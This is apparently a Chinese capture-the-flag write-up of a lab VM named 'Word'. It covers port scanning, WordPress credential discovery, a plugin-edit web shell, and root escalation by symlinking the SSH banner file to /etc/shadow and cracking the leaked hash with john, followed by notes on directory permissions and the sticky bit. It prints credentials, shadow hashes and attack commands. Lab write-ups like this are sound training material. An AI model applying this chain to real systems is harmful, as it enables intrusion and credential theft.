# 1.信息收集
```
┌──(root㉿kali)-[/tmp/test]
└─# nmap --min-rate 10000 -p- 192.168.2.66 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:50 EST
Nmap scan report for 192.168.2.66
Host is up (0.0022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
                                                                                                 
┌──(root㉿kali)-[/tmp/test]
└─# nmap -sV -sC -O -p22,80 192.168.2.66  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:50 EST
Nmap scan report for 192.168.2.66
Host is up (0.00026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.90 seconds
                                                                                                 
┌──(root㉿kali)-[/tmp/test]
└─# nmap --script=vuln -p22,80 192.168.2.66
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:51 EST
Nmap scan report for 192.168.2.66
Host is up (0.00027s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 37.48 seconds

┌──(root㉿kali)-[/tmp/test]
└─# nmap -sU --top-ports 20 192.168.2.66   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 10:01 EST
Nmap scan report for 192.168.2.66
Host is up (0.00028s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown
MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 14.55 seconds

```
常规开放22 80端口，udp保留，可以看到80是wordpress。

# 2.web渗透

访问web主页源码提示，看来需要配置hosts文件
```
<!-- word.dsz -->
```
配置后进入web，访问wordpress，常规进行目录扫描
```
┌──(root㉿kali)-[/tmp/test]
└─# dirsearch -u http://192.168.2.66/wordpress/

Target: http://192.168.2.66/

[10:05:06] Starting: wordpress/
[10:05:39] 301 -    0B  - /wordpress/index.php  ->  http://192.168.2.66/wordpress/
[10:05:39] 301 -    0B  - /wordpress/index.php/login/  ->  http://192.168.2.66/wordpress/login/
[10:05:42] 200 -    7KB - /wordpress/license.txt                            
[10:05:55] 200 -    3KB - /wordpress/readme.html                            
[10:06:11] 301 -  325B  - /wordpress/wp-admin  ->  http://192.168.2.66/wordpress/wp-admin/
[10:06:11] 400 -    1B  - /wordpress/wp-admin/admin-ajax.php                
[10:06:11] 200 -    0B  - /wordpress/wp-config.php                          
[10:06:11] 409 -    3KB - /wordpress/wp-admin/setup-config.php              
[10:06:11] 302 -    0B  - /wordpress/wp-admin/  ->  http://word.dsz/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.2.66%2Fwordpress%2Fwp-admin%2F&reauth=1
[10:06:11] 200 -  575B  - /wordpress/wp-admin/install.php
[10:06:11] 200 -    0B  - /wordpress/wp-content/                            
[10:06:11] 301 -  327B  - /wordpress/wp-content  ->  http://192.168.2.66/wordpress/wp-content/
[10:06:12] 200 -    0B  - /wordpress/wp-content/plugins/hello.php           
[10:06:12] 200 -  422B  - /wordpress/wp-content/upgrade/                    
[10:06:12] 200 -  461B  - /wordpress/wp-content/uploads/                    
[10:06:12] 301 -  328B  - /wordpress/wp-includes  ->  http://192.168.2.66/wordpress/wp-includes/
[10:06:12] 200 -    0B  - /wordpress/wp-includes/rss-functions.php          
[10:06:12] 200 -    0B  - /wordpress/wp-cron.php
[10:06:12] 200 -    3KB - /wordpress/wp-login.php                           
[10:06:12] 200 -    6KB - /wordpress/wp-includes/                           
[10:06:12] 302 -    0B  - /wordpress/wp-signup.php  ->  http://word.dsz/wordpress/wp-login.php?action=register
[10:06:13] 405 -   42B  - /wordpress/xmlrpc.php
```
全部看一遍可以在upload下找到密码凭据，主页可以看到用户名是root，完整凭据

```
root:S9ZF6mtLdHfmr8PmCq3i
```

常规wordpress改插件拿shell
![[Pasted image 20251115230958.png]]
在做目录爆破时已经的到了hello.php的路径，访问弹shell即可
# 3.提权

发现web主目录下有banner.php，内容大体改一下ssh的banner样式
```
www-data@Word:/var/www/html$ cat banner.php 
<?php
// 设置页面标题和字符编码
$page_title = "定制你的SSH欢迎界面";
$saved_message = "";

// 处理表单提交
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['banner_text'])) {
    $banner_text = $_POST['banner_text'];
    $file_path = '/home/ssh-banner/banner.txt';
    
    // 确保目录存在
    $dir = dirname($file_path);
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    
    // 尝试保存文件
    if (file_put_contents($file_path, $banner_text) !== false) {
        $saved_message = "Banner Saved.  try ssh ";
    } else {
        $saved_message = "Banner Saved failed.";
    }
}

// 尝试读取现有内容
$current_content = "";
$file_path = '/home/ssh-banner/banner.txt';
if (file_exists($file_path)) {
    $current_content = htmlspecialchars(file_get_contents($file_path));
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title><?php echo $page_title; ?></title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 30px;
            margin-top: 20px;
        }
        h1 {
            color: #2c3e50;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        textarea {
            width: 100%;
            height: 200px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-family: monospace;
            resize: vertical;
        }
        .btn {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .btn:hover {
            background-color: #2980b9;
        }
        .message {
            padding: 10px;
            margin: 15px 0;
            border-radius: 4px;
            text-align: center;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .preview {
            background-color: #2c3e50;
            color: #ecf0f1;
            border-radius: 4px;
            padding: 15px;
            margin-top: 20px;
            font-family: monospace;
            white-space: pre-wrap;
        }
        .preview-title {
            font-weight: bold;
            margin-bottom: 10px;
            color: #3498db;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1><?php echo $page_title; ?></h1>
        
        <?php if (!empty($saved_message)): ?>
            <div class="message <?php echo strpos($saved_message, '错误') !== false ? 'error' : 'success'; ?>">
                <?php echo $saved_message; ?>
            </div>
        <?php endif; ?>
        
        <form method="POST" action="">
            <div class="form-group">
                <label for="banner_text">SSH欢迎信息内容：</label>
                <textarea id="banner_text" name="banner_text" placeholder="在此输入SSH登录时显示的欢迎信息..."><?php echo $current_content; ?></textarea>
            </div>
            
            <button type="submit" class="btn">保存Banner</button>
        </form>
        
        <?php if (!empty($current_content)): ?>
        <div class="preview">
            <div class="preview-title">预览效果：</div>
            <?php echo nl2br($current_content); ?>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>
```

在ssh-banner家目录下可以拿到user.txt，并且可以看到banner

```
www-data@Word:/home/ssh-banner$ ls -al
total 28
drwxr-xr-x 2 ssh-banner ssh-banner 4096 Nov 15 03:51 .
drwxr-xr-x 3 root       root       4096 Nov 14 21:59 ..
lrwxrwxrwx 1 root       root          9 Nov 15 03:51 .bash_history -> /dev/null
-rw-r--r-- 1 ssh-banner ssh-banner  220 Nov 14 21:59 .bash_logout
-rw-r--r-- 1 ssh-banner ssh-banner 3526 Nov 14 21:59 .bashrc
-rw-r--r-- 1 ssh-banner ssh-banner  807 Nov 14 21:59 .profile
-rwxrwxrwx 1 root       root        216 Nov 14 22:09 banner.txt
-rw-r--r-- 1 root       root         44 Nov 14 22:10 user.txt

```
这里我之前存在权限误区，导致提权方向错误，经过群主指导完全解决

可以看到banner.php代码内容会检查是否存在banner.txt文件，如果不存在则创建
可以看到banner的属组是root，但是并不代表banner.php的执行权限是root，这个banner文件是靶机制作时以root权限创建的，仅此而已

banner.php基于apache2部署到web页面，所以执行权限是apache2的worker进程权限

无论对于apache2或是nginx，web页面代码执行权限均是worker进程权限，对于apache2，第一个apache2进程为master进程，其余为worker进程，对于nginx，进程会表明master进程与worker进程

```
www-data@Word:/home/ssh-banner$ ps -aux | grep apache2
root         448  0.0  1.7 253924 34980 ?        Ss   09:49   0:00 /usr/sbin/apache2 -k start
www-data     472  0.0  2.1 256892 43376 ?        S    09:49   0:00 /usr/sbin/apache2 -k start
www-data     474  0.0  2.4 330872 50900 ?        S    09:49   0:01 /usr/sbin/apache2 -k start
www-data     475  0.0  3.0 333684 61368 ?        S    09:49   0:00 /usr/sbin/apache2 -k start
www-data     623  0.0  2.3 257672 47440 ?        S    09:51   0:00 /usr/sbin/apache2 -k start
www-data     626  0.0  2.3 257736 47656 ?        S    09:51   0:00 /usr/sbin/apache2 -k start
www-data     628  0.0  2.3 331100 48640 ?        S    09:51   0:00 /usr/sbin/apache2 -k start
www-data     775  0.0  2.7 331760 55940 ?        S    10:08   0:00 /usr/sbin/apache2 -k start
www-data     776  0.0  2.4 329412 49912 ?        S    10:08   0:00 /usr/sbin/apache2 -k start
www-data     777  0.0  1.1 254472 23516 ?        S    10:08   0:00 /usr/sbin/apache2 -k start
www-data     780  0.0  1.9 254828 39028 ?        S    10:08   0:00 /usr/sbin/apache2 -k start
www-data     946  0.0  0.0   6516   640 pts/0    S+   10:18   0:00 grep apache2

```

一顿翻找在dpkg -V中找到可疑文件，得到ssh-banner用户凭据
```
www-data@Word:/home/ssh-banner$ dpkg -V 2>/dev/null
??5?????? c /etc/irssi.conf
??5?????? c /etc/apache2/apache2.conf
??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/systemd-networkd.pkla
??5??????   /usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool
??5?????? c /etc/grub.d/10_linux
??5?????? c /etc/grub.d/40_custom
??5?????? c /etc/sudoers
??5?????? c /etc/sudoers.d/README
??5?????? c /etc/inspircd/inspircd.conf
??5?????? c /etc/inspircd/inspircd.motd
??5?????? c /etc/inspircd/inspircd.rules
??5??????   /usr/bin/top
??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/org.freedesktop.packagekit.pkla
??5?????? c /etc/issue
www-data@Word:/home/ssh-banner$ file /usr/bin/top 
/usr/bin/top: Bourne-Again shell script, ASCII text executable
www-data@Word:/home/ssh-banner$ cat /usr/bin/top 
#!/bin/bash

echo 'jUOhu37yYllYiVxQNw8G'
systemctl restart ssh

```

到目前为止还有banner信息未使用，随便跑一次ssh可以看到，banner即为banner.txt中的内容，不过ssh仅仅展示banner，并不执行banner

```
ssh-banner@Word:~$ ps -aux | grep sshd
root        1136  0.0  0.3  13288  7004 ?        Ss   10:32   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
ssh-ban+    1138  0.0  0.0   6516   644 pts/0    S+   10:32   0:00 grep sshd

```
可以看到ssh进程权限为root，而且在ssh config文件中可以看到会读取banner.txt

```
ssh-banner@Word:~$ cat /etc/ssh/sshd_config | grep banner
# no default banner path
Banner /home/ssh-banner/banner.txt

```
所以提权思路是，修改banner.txt文件，建立软连接指向shadow文件，因为sshd进程为root权限，所以在ssh连接时可以成功读取shadow文件，从而破解密码hash得到root权限

```
ssh-banner@Word:~$ rm -f banner.txt 
ssh-banner@Word:~$ ln -s /etc/shadow banner.txt
ssh-banner@Word:~$ ls -al | grep banner.txt 
lrwxrwxrwx 1 ssh-banner ssh-banner   11 Nov 15 10:35 banner.txt -> /etc/shadow

```

```
┌──(root㉿kali)-[/tmp/test]
└─# ssh ssh-banner@192.168.2.66
root:$6$2KzhPia8Wwzs7L/E$7aa6JS7MQvMCqzGn3Q4Q.4dIWFzuic/l/VxOCMsU95I4zNYCpXD6GXv2ixswndTcY/ow9475lR2Dx7j5VWagc0:20407:0:99999:7:::
daemon:*:20166:0:99999:7:::
bin:*:20166:0:99999:7:::
sys:*:20166:0:99999:7:::
sync:*:20166:0:99999:7:::
games:*:20166:0:99999:7:::
man:*:20166:0:99999:7:::
lp:*:20166:0:99999:7:::
mail:*:20166:0:99999:7:::
news:*:20166:0:99999:7:::
uucp:*:20166:0:99999:7:::
proxy:*:20166:0:99999:7:::
www-data:*:20166:0:99999:7:::
backup:*:20166:0:99999:7:::
list:*:20166:0:99999:7:::
irc:*:20166:0:99999:7:::
gnats:*:20166:0:99999:7:::
nobody:*:20166:0:99999:7:::
_apt:*:20166:0:99999:7:::
systemd-timesync:*:20166:0:99999:7:::
systemd-network:*:20166:0:99999:7:::
systemd-resolve:*:20166:0:99999:7:::
systemd-coredump:!!:20166::::::
messagebus:*:20166:0:99999:7:::
sshd:*:20166:0:99999:7:::
mysql:!:20407:0:99999:7:::
ssh-banner:$6$UNnjY.C7H66/tvez$yG9zHwkfnQY8LS0j52PFbeQWg3qUwaywqMnYXDswu10IbY2lgvhL8m1IqhDbHM0McJVnCt10FtWPg.yq87CL11:20407:0:99999:7:::
ssh-banner@192.168.2.66's password: 
```
拿出hash john破解即可
```
┌──(root㉿kali)-[/tmp/test]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt  hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
********         (root)     
1g 0:00:00:07 DONE (2025-11-15 10:37) 0.1386g/s 2627p/s 2627c/s 2627C/s sweetgurl..playas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
提权即可
```
ssh-banner@Word:~$ su
Password: 
root@Word:/home/ssh-banner# cat /root/root.txt;cat /home/ssh-banner/user.txt 
flag{root-a46ec67a0f2e7c387926ac5d783ea4b8}
flag{user-3a9dc01d01eb76d0fdd0fafa9f5fda79}
```
写完wp，我最想说的是

*==**SSH Banner配置进行提权，这是一个极其极其极其不常见但又极其极其极其合理的攻击向量***==
附上ds的图
![[Pasted image 20251116094617.png]]



为什么ssh-banner能够删除属组为root权限为777的文件，www-data却不能，同样的如果在tmp目录下以root身份创建同样权限的文件，为什么ssh-banner用户就也删不掉了，这里涉及比较细的权限知识

可以看如下例子

```
www-data@Word:/home/ssh-banner$ ls -al | grep banner.txt
-rwxrwxrwx 1 root       root          0 Nov 15 21:12 banner.txt
www-data@Word:/home/ssh-banner$ rm -f banner.txt
rm: cannot remove 'banner.txt': Permission denied
```

```
ssh-banner@Word:~$ ls -al | grep banner.txt
-rwxrwxrwx 1 root       root          0 Nov 15 21:12 banner.txt
ssh-banner@Word:~$ rm -f banner.txt 
ssh-banner@Word:~$ ls -al | grep banner.txt
ssh-banner@Word:~$ 
```

```
root@Word:/tmp# touch test
root@Word:/tmp# chmod 777 test
root@Word:/tmp# ls -al | grep test 
-rwxrwxrwx  1 root root    0 Nov 15 21:19 test
root@Word:/tmp# su ssh-banner
ssh-banner@Word:/tmp$ rm -f test 
rm: cannot remove 'test': Operation not permitted
ssh-banner@Word:/tmp$ exit
exit
root@Word:/tmp# su www-data
www-data@Word:/tmp$ rm -f test 
rm: cannot remove 'test': Operation not permitted
www-data@Word:/tmp$ 
```
关键原因在于文件上级目录的**写**权限，与该文件的权限没有必然联系，同样目录下的文件夹也是同理

这两个目录分别属于ssh-banner，以及root，可以看下面这个例子

ssh-banner属组ssh-banner，ssh-banner用户具有rwx权限
test属组root，所有用户具有rwx权限
test1属组root，所以用户具有rwx权限，目录有Sticky Bit

```
ssh-banner@Word:/home$ ls -al
total 16
drwxr-xr-x  4 root       root       4096 Nov 15 21:38 .
drwxr-xr-x 18 root       root       4096 Mar 18  2025 ..
drwxr-xr-x  2 ssh-banner ssh-banner 4096 Nov 15 21:33 ssh-banner   #1
drwxrwxrwx  2 root       root       4096 Nov 15 21:47 test         #2
drwxrwxrwt  2 root       root       4096 Nov 15 21:55 test1        #3
```
先看1与2的对比，在1，2目录下创建相同权限的text文件，并分别使用ssh-banner用户以及www-data用户删除文件

```
root@Word:/home/test# ls -la text ;ls -al ../ssh-banner/text 
-rw-r--r-- 1 root root 0 Nov 15 21:58 text
-rw-r--r-- 1 root root 0 Nov 15 21:58 ../ssh-banner/text

ssh-banner@Word:~$ rm -f text 
ssh-banner@Word:~$ cd ../test
ssh-banner@Word:/home/test$ rm -f text 


www-data@Word:/home/test$ rm -f text 
www-data@Word:/home/test$ cd ../ssh-banner/
www-data@Word:/home/ssh-banner$ rm -f text 
rm: cannot remove 'text': Permission denied

```
可以看到ssh-banner用户可以删除这两个文件，即使他只有对文件的读权限，同样www-data可以删除2下的文件，但是不能删除1下的文件

现在给ssh-banner加777权限，同样即使加007权限，www-data也是可以删除的

```
root@Word:/home# chmod 777 ssh-banner/
root@Word:/home# ls -al 
total 24
drwxr-xr-x  6 root       root       4096 Nov 15 21:55 .
drwxr-xr-x 18 root       root       4096 Mar 18  2025 ..
drwxrwxrwx  2 ssh-banner ssh-banner 4096 Nov 15 22:01 ssh-banner
drwxrwxrwx  2 root       root       4096 Nov 15 22:01 test
drwxr-xr-x  2 root       root       4096 Nov 15 21:54 test1
root@Word:/home# cd ssh-banner/
root@Word:/home/ssh-banner# su www-data
www-data@Word:/home/ssh-banner$ ls -al
total 24
drwxrwxrwx 2 ssh-banner ssh-banner 4096 Nov 15 22:01 .
drwxr-xr-x 6 root       root       4096 Nov 15 21:55 ..
lrwxrwxrwx 1 root       root          9 Nov 15 03:51 .bash_history -> /dev/null
-rw-r--r-- 1 ssh-banner ssh-banner  220 Nov 14 21:59 .bash_logout
-rw-r--r-- 1 ssh-banner ssh-banner 3526 Nov 14 21:59 .bashrc
-rw-r--r-- 1 ssh-banner ssh-banner  807 Nov 14 21:59 .profile
-rw-r--r-- 1 root       root          0 Nov 15 22:01 text
-rw-r--r-- 1 root       root         44 Nov 14 22:10 user.txt
www-data@Word:/home/ssh-banner$ rm -f text 
www-data@Word:/home/ssh-banner$
```


再看2和3，所以用户均为rwx权限但是有Sticky Bit的区别

```
root@Word:/home# ls -al
total 20
drwxr-xr-x  5 root       root       4096 Nov 15 22:08 .
drwxr-xr-x 18 root       root       4096 Mar 18  2025 ..
drwxrwxrwx  2 ssh-banner ssh-banner 4096 Nov 15 22:06 ssh-banner
drwxrwxrwx  2 root       root       4096 Nov 15 22:01 test
drwxrwxrwt  2 root       root       4096 Nov 15 21:54 test1
root@Word:/home# touch test/text && touch test1/text
root@Word:/home# ls -al test/text && ls test1/text -al
-rw-r--r-- 1 root root 0 Nov 15 22:09 test/text
-rw-r--r-- 1 root root 0 Nov 15 22:09 test1/text

root@Word:/home# su www-data
www-data@Word:/home$ rm -f test/text && rm -f test1/text 
rm: cannot remove 'test1/text': Operation not permitted
www-data@Word:/home$ ls test -al
total 8
drwxrwxrwx 2 root root 4096 Nov 15 22:10 .
drwxr-xr-x 5 root root 4096 Nov 15 22:08 ..
www-data@Word:/home$ touch test1/text_wd
www-data@Word:/home$ rm -f test1/text_wd 
```
仍然无法删除，但是自己的文件可以删除

==**所以，用户是否能删除本级目录下的文件以及目录，影响因素是该用户是否具有本级目录的写权限，以及本级目录是否具有Sticky Bit限制，与其他的无关包括文件本身的权限均无关，如果具有Sticky Bit限制则只能删除属于自己的文件